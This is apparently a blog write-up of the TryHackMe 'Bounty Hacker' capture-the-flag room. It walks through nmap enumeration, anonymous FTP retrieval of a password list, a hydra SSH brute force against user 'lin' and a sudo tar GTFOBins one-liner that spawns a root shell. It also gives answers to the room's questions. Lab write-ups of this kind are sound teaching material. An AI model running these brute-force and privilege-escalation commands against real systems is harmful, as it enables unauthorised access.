https://tryhackme.com/room/cowboyhacker

*You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!*

----

1) Enumeration / Service Discovery

```bash
# Nmap 7.91 scan initiated Mon Jul 26 08:17:23 2021 as: nmap -p- -A -Pn -oA resultsNmap -vv 10.10.61.20
adjust_timeouts2: packet supposedly had rtt of -495795 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -495795 microseconds.  Ignoring time.
Nmap scan report for 10.10.61.20
Host is up, received user-set (0.16s latency).
Scanned at 2021-07-26 08:17:24 IST for 800s
Not shown: 55529 filtered ports, 10003 closed ports
Reason: 55529 no-responses and 10003 resets
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 60 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.9.26
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgcwCtWTBLYfcPeyDkCNmq6mXb/qZExzWud7PuaWL38rUCUpDu6kvqKMLQRHX4H3vmnPE/YMkQIvmz4KUX4H/aXdw0sX5n9jrennTzkKb/zvqWNlT6zvJBWDDwjv5g9d34cMkE9fUlnn2gbczsmaK6Zo337F40ez1iwU0B39e5XOqhC37vJuqfej6c/C4o5FcYgRqktS/kdcbcm7FJ+fHH9xmUkiGIpvcJu+E4ZMtMQm4bFMTJ58bexLszN0rUn17d2K4+lHsITPVnIxdn9hSc3UomDrWWg+hWknWDcGpzXrQj
CajO395PlZ0SBNDdN+B14E0m6lRY9GlyCD9hvwwB
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMCu8L8U5da2RnlmmnGLtYtOy0Km3tMKLqm4dDG+CraYh7kgzgSVNdAjCOSfh3lIq9zdwajW+1q9kbbICVb07ZQ=
|   256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqmJn+c7Fx6s0k8SCxAJAoJB7pS/RRtWjkaeDftreFw
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

2) Foothold

Observations

- Port 80 - Apache 2.4.18

- Home page seems to have a big image from the Cowboy Bebop anime. Which seems to be stored in the `/images/` dir. Visiting that dir shows that dir listing allowed. Running feroxbuster on the web portal in parallel.

![Alt Text](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ccm1qecmrfjp6njxxlp7.png)
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/z3ffue7qq17elagkyvti.png)

- FTP Anon login allowed. Got two files -> locks.txt and tasks.txt.
```bash
└─$ ftp 10.10.61.20                                                                  
Connected to 10.10.61.20.                                                                                                                                                  
220 (vsFTPd 3.0.3)                                                                                                                                                         
Name (10.10.61.20:kali): Anonymous                                                                                                                                         
230 Login successful.                                                                
Remote system type is UNIX.                                                          
Using binary mode to transfer files.                                                 
ftp> ls                                                                              
200 PORT command successful. Consider using PASV.                                    
150 Here comes the directory listing.                                                                                                                                      
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt                    
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt                     
226 Directory send OK.
```

tasks.txt
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

> Q3: Who wrote the task list?  
> A3: lin

`locks.txt` seems to contain a what looks like a list of passwords. 
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vf4yzqa3fvj00ew740k8.png)

Let's try to bruteforce ssh with the probable password list provided and the username `lin`
```bash
└─$ hydra -l lin -P locks.txt ssh://10.10.61.20
[22][ssh] host: 10.10.61.20   login: lin   password: CENSORED
```

Success!

> Q4: What service can you bruteforce with the text file found?
> A4: SSH 

> Q5: What is the users password? 
> A5: Result of `ssh` bruteforce using `hydra`

Let's ssh into the machine with this username/password combo. This allows us to get `user.txt`

> Q6: user.txt
> A6: Answer in `/home/lin/user.txt`

Now we have a proper foothold in the machine.

3) Privilege Escalation

```bash
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

So we can run `tar` as `root` user. Note the absence of `NOPASSWD` here. You will still need the lin user`s password to do this. Fortunately we have that.

Using [Tar GTFOBins](https://gtfobins.github.io/gtfobins/tar/) for Privilege Escalation

````bash
lin@bountyhacker:~/Desktop$ sudo tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
# id
uid=0(root) gid=0(root) groups=0(root)
````


Use this shell to navigate to `/root/` and get the root flag.

>Q7: root.txt 
A7: Answer in `/root/root.txt`

Pretty simple box to solve. Thanks for reading! 

Try it at https://tryhackme.com/room/cowboyhacker